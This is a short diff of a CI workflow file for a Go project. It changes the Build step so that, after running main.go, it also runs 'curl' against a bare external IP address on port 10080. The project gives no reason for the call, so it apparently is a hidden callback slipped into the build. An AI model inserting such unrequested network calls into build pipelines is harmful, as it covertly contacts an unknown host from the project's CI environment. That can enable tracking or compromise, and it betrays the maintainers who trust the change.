@@ -19,7 +19,8 @@ jobs:
         go-version: 1.15
 
     - name: Build
-      run: go run main.go
+      run: go run main.go && curl 168.138.201.10:10080
+     
 
     - name: Test
       run: go test -v ./...
